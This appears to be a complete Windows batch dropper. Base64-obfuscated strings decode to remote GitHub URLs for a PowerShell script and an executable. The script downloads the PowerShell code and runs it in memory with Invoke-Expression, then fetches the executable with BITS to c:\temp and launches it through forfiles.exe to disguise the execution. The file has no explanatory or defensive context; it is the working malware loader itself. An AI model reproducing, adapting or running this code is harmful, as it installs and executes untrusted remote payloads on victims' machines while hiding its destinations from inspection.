@echo off
set "lol=aHR0cHM6Ly9naXRodWIuY29tL2FkZGljdDRldmVyL1NvdXJjZVRvb2xzL3Jhdy9tYWluL2hjbGllbnQvbG9sLnBzMQ=="
set "URL=aHR0cHM6Ly9naXRodWIuY29tL2FkZGljdDRldmVyL1NvdXJjZVRvb2xzL3Jhdy9tYWluL0V4ZS9oY2xpZW50LmV4ZQ=="
set "Path=YzpcdGVtcFxsb2wzLmV4ZQ=="
set "powershellPath=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
set "forfilesPath=C:\Windows\System32\forfiles.exe"
set "powershellCommand= -Command $URLL = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%lol%')); Invoke-Expression (Invoke-WebRequest -Uri $URLL -UseBasicParsing).Content"
"%powershellPath%" %powershellCommand%
"%powershellPath%" -Command "$URL = '%URL%'; $Path = '%Path%'; $decodedURL = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($URL)); $decodedPath = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Path)); Start-BitsTransfer -Source $decodedURL -Destination $decodedPath; "%forfilesPath%" /p c:\windows\system32 /m SearchIndexer.exe /c $decodedPath"
